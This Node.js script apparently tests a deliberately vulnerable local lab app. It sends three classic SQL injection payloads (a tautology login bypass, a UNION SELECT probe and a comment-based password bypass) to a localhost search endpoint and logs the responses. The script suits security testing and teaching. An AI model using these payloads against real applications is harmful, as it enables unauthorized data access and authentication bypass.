const http = require('http');

console.log('Testing SQL Injection vulnerabilities...\n');

const tests = [
    {
        name: 'Basic SQL Injection',
        payload: "admin' OR '1'='1",
        expected: 'Should return all users'
    },
    {
        name: 'Union-based SQLi',
        payload: "' UNION SELECT 1,2,3,4,5-- -",
        expected: 'Should return additional rows'
    },
    {
        name: 'Comment bypass',
        payload: "admin'-- -",
        expected: 'Should bypass password check'
    }
];

tests.forEach(test => {
    const options = {
        hostname: 'localhost',
        port: 3000,
        path: `/sqli/search?username=${encodeURIComponent(test.payload)}`,
        method: 'GET'
    };

    const req = http.request(options, (res) => {
        let data = '';
        
        res.on('data', (chunk) => {
            data += chunk;
        });
        
        res.on('end', () => {
            console.log(`Test: ${test.name}`);
            console.log(`Payload: ${test.payload}`);
            console.log(`Expected: ${test.expected}`);
            console.log(`Response: ${data}\n`);
        });
    });

    req.on('error', (error) => {
        console.error(`Error in test ${test.name}:`, error);
    });

    req.end();
});
